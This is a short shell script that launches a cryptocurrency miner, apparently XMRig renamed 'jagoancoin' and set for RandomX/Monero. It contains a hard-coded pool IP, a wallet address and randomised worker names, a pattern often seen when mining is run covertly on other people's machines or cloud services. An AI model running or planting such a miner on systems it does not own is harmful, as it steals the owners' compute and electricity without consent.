POOL=51.79.222.181:80

WALLET=1HxsnTRFipQ4L3jqMbbJEYwideoGsDBR62

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MJ)

chmod +x jagoancoin

./jagoancoin --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0
